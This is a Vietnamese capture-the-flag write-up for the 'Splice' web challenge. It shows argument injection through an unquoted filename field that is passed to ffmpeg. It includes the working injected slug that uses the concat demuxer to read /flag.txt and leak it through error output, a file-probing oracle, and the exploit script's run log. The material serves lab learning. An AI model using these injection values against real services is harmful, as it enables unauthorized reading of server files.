# Splice — Web (Hard)

**Flag:** `WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}` (Điểm: 300 pts) 
**Trường quay:** H7TEX 2026 host trên nền tảng WebVerse
**Máy chủ mục tiêu:** `https://ced0f13a-5765-splice-5ba63.mystery-challenges.webverselabs-pro.com` (Hệ thống Express, núp sau lá chắn Cloudflare)
**Tài nguyên trắng:** Không hề có tệp đính kèm (bundle) nào. Toàn bộ cuộc mổ xẻ đều dựa lưng vào những mẩu mã nguồn (source) rò rỉ mà chính ứng dụng phơi ra qua các đường `/studio`, `/public/css/site.css`, và cấu trúc JSON vớt từ `/api/render`.

## Đề bài

Hệ thống Tapedeck đóng vai trò là một dịch vụ máy chủ chứa (hosting) podcast. Cánh cổng Studio của nó cho phép nhận một đoạn âm thanh (clip audio), rồi ném vào lò "kết xuất" (render) để nặn ra một bức tranh sóng âm (audiogram/poster) cho phép người dùng tải về. 
Đề bài thảy lại một câu khều: *"Hãy soi kỹ xem cái lò render đó đặt tên và xào nấu các tệp trả về như thế nào"*. Phía WebVerse còn tử tế gán luôn nhãn mác cho bài này là CMDI (Command Injection - Tiêm lệnh hệ thống). 
Một điểm lưu tâm: Cờ (flag) bị giam lỏng trực tiếp trên máy chủ, người chơi không có bất kỳ file tải về nào (artifact) để vọc offline.

## Phân tích ban đầu

Mặt tiền `/studio` đã tự tay lột trần 3 công đoạn của hệ thống cống rãnh (pipeline):

```html
<form method="post" action="/studio/upload" enctype="multipart/form-data">
  <input type="file" name="clip" accept="audio/*">
</form>

<p class="sub">The export name is used as the poster filename.</p>
<!-- Tên xuất ra sẽ được dùng làm tên tệp poster -->
<input id="slugInput" name="slug" value="audiogram">
```

Kế đến là kịch bản JS lén lút mớm API `/api/render`:

```js
fetch('/api/render', {method:'POST', headers:{'Content-Type':'application/json'},
  body: JSON.stringify({slug: ..., theme: ...})})
  .then(...)
  // Ghi chú đắt giá: API này CÓ nhả về trường `errors` nếu gặp nạn sụp hầm (failure). 
  // Thế nhưng mặt tiền Studio (UI) lại giấu biệt cái trường này đi.
```

Chốt hai tử huyệt lộ diện:
1. Trường xuất tên (export name) bị bê nguyên si để đóng thành tên file đầu ra.
2. API thực chất có luồng xả lỗi (field `errors`) nhưng giao diện cố tình bưng bít -> Cứ vã trực tiếp cục JSON là ta sẽ hứng trọn cái luồng lỗi `stderr` quý giá.

Test máy (Baseline): Quăng bừa một file WAV 2 giây tự đẻ, đục lệnh render kèm `slug=audiogram`:

```json
{"ok": true, "outputs": [{"file": "audiogram.png", "url": "/m/b9f13764512c81b7/audiogram.png"}], "errors": null}
```

## Chuỗi khai thác

**Bước 1 - Lùng sục khe hở tiêm lệnh.** 
Cửa tiêm mã shell đã bị hàn cứng, nhưng cửa tiêm biến số tham số (argv) thì lại mở toang:

```text
Gài thử: slug = "x -h"
Nhận xả lỗi errors: "Unrecognized option 'h.png'.
         Error splitting the argument list: Option not found"
```

Cụm `-h.png` chình ình hiện hình như một tham số argv độc lập. Bằng chứng thép: Chuỗi lệnh đã bị cưa đôi (tách) bằng dấu khoảng trắng trước khi tọng vào họng cỗ máy `ffmpeg`. Và vì phần tên file `slug + ".png"` không hề bị nhốt trong ngoặc kép (quote), nên bất cứ thứ quỷ quái nào ta nhét đằng sau dấu cách sẽ tự động biến thành tham số điều khiển mới cho `ffmpeg`.

**Bước 2 - Lên đồ nghề (primitive) trích xuất file.** 
Trong kho vũ khí tiêm argv, ta có 2 thanh bảo kiếm: dùng `-i` để nhồi thêm file đầu vào (input), hoặc dùng `-f` để bẻ lái luồng giải mã (demuxer). Đường tắt đẫm máu nhất là ép `ffmpeg` nhai sống cái file đích bằng lệnh trộn (concat demuxer):

```text
Nhồi: slug = "a.png -f concat -i /flag.txt b.png"
```

Oái oăm (và cũng là điểm ăn tiền) của thuật trộn Concat là nó đòi file đầu vào phải là dạng script cứng ngắc, mỗi dòng bắt buộc phải nặn theo khuôn `file '...'` hoặc `duration n`. Đương nhiên, cái dòng chữ đầu tiên của file `/flag.txt` sẽ sặc sụa vi phạm khuôn mẫu này. Kết quả? Thằng `ffmpeg` chửi bới ỏm tỏi và tiện mồm xướng luôn nguyên văn cái dòng đó vào báo cáo lỗi:

```text
[concat @ 0x6145f8caea80] Dòng 1 (Line 1): từ khóa lạ hoắc (unknown keyword) 'WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}'
/flag.txt: Invalid data found when processing input
```

Máy chủ hồn nhiên nhét toàn bộ cụm `stderr` đó vào cái ống xả `errors`, đưa lá cờ rơi thẳng vào tay ta ngay trên phản hồi (response). Ta chẳng phải mệt nhọc render bức ảnh nào, khỏi xài máy đọc chữ OCR, cũng khỏi phải bới tung workspace lên để lôi file ra.

**Bước 3 - Rà quét hang ổ của cờ.** 
Cùng một phép thử oracle, ta có thể phán xét một file có tồn tại hay không thông qua tiếng chửi của hệ thống:

```text
/flag.txt              -> Hét: Dòng 1 (Line 1) unknown keyword 'WEBVERSE{...}' (TRÚNG ĐÍCH)
/flag                  -> Hét: No such file or directory (Không có)
/opt/app/flag.txt      -> Hét: No such file or directory
/app/flag.txt          -> Hét: No such file or directory
./flag.txt             -> Hét: No such file or directory
```

**Bước 4 - Khẳng định vị thế (Kiểm chứng phi trạng thái).** 
Kịch bản `exploit.py` được thiết kế để tự động xé lớp áo cũ, mở một phiên giao dịch (session) mới toanh (cookie `td_session` sẽ tự đẻ ra một không gian làm việc workspace riêng). Máy sẽ tự nặn ra file WAV bằng module `wave`, upload lên và thụt đúng một đòn render duy nhất. 
Thử nghiệm trên một workspace hoàn toàn xa lạ (`0d6a6fc0562fc2eb`), khác bọt so với lúc dò đường probe (`b9f13764512c81b7`), hệ thống vẫn ngoan ngoãn nôn ra đúng một chuỗi cờ y hệt. Công đoạn vớt cờ được chốt hạ bằng con dao regex tỉa gọn các byte vừa chụp được trên lưới mạng, rồi tọng ngay vào tệp `flag.txt`.

## Flag
```bash
python exploit.py https://ced0f13a-5765-splice-5ba63.mystery-challenges.webverselabs-pro.com
```

Giao diện tác chiến:
```text
[*] Định hình session: td_session=s%3Af9iYs9oShh5WGUU6amVzf3gfG...
[*] Bơm upload -> Báo cáo HTTP 200
[*] Cày render -> Báo cáo HTTP 200
[+] Vớt được WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}
```

```text
WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}
```

(Lưu ý: Mang chiến lợi phẩm nộp tại ô SUBMIT FLAG trên cổng WebVerse của chướng ngại vật (`/e/YfQq-BkjAX1I9bECP5U9xcsY/c/28`). Lệnh giải (solve) sẽ mất tầm 60 giây để đồng bộ (sync) xác nhận ngược về sổ bộ H7TEX theo email tài khoản).
